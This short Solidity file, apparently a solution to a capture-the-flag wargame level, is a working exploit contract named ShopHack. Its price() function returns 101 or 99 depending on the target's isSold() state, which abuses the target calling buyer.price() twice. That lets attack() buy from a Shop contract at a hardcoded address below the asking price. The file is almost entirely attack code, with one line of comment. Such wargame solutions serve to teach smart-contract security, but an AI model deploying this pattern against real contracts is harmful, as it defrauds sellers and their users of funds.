// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract ShopHack {

  bool public toggle = false;
  Shop public target;

  // exploit here lies in how buyer.price() is called twice
  function price() public returns (uint){
    if(!target.isSold()){
        return 101;
    }
    else{
        return 99;
    }
  }

  // call target instance from contract
  function attack() public{
    target = Shop(0x982698B13225d9ed3BeCa7F9954894b6637b9bEA);
    target.buy();
  }

}
